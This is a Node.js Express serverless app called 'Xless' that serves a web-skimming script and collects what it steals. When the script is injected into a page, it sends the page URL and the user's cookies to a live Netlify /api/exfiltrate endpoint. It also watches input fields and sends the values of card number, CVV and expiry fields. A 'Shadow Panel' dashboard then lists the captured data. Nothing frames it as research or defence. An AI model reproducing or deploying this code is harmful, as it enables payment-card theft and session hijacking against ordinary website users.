const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let capturedData = [];

app.post('/api/exfiltrate', (req, res) => {
    const data = req.body;
    data.time = new Date().toLocaleString();
    capturedData.unshift(data);
    res.json({ status: 'success' });
});

app.get('/api/data', (req, res) => {
    res.json(capturedData);
});

app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    // تم تحديث الرابط هنا ليرسل إلى موقعك الجديد
    res.send("console.log('Xless Active'); var target = 'https://willowy-kataifi-31efc6.netlify.app/api/exfiltrate'; function send(d){ fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)}); } send({ url: location.href, cookies: document.cookie, type: 'initial' }); document.addEventListener('input', function(e){ var i = e.target; var n = (i.name || i.id || '').toLowerCase(); if(n.includes('card') || n.includes('number') || n.includes('cvv') || n.includes('exp') || n.includes('titolare')){ send({ field: n, value: i.value, type: 'card_data' }); } });");
});

app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Xless Dashboard</title><style>body{font-family:sans-serif;padding:20px;background:#1a1a1a;color:#fff}table{width:100%;border-collapse:collapse;background:#2a2a2a}th,td{padding:12px;border:1px solid #444;text-align:left}th{background:#4CAF50;color:#fff}pre{white-space:pre-wrap;word-wrap:break-word;color:#00ff00}</style></head>
        <body>
            <h1>Xless Shadow Panel - Active</h1>
            <button onclick="location.reload()" style="padding:10px 20px;cursor:pointer">Refresh Data</button>
            <table style="margin-top:20px">
                <thead><tr><th>Time</th><th>Captured Data</th></tr></thead>
                <tbody id="data-body"></tbody>
            </table>
            <script>
                fetch('/api/data').then(r=>r.json()).then(data=>{
                    var html = "";
                    data.forEach(d=>{
                        html += "<tr><td>"+d.time+"</td><td><pre>"+JSON.stringify(d,null,2)+"</pre></td></tr>";
                    });
                    document.getElementById('data-body').innerHTML = html || "<tr><td colspan='2'>No data yet...</td></tr>";
                });
            </script>
        </body>
        </html>
    `);
});

module.exports.handler = serverless(app);
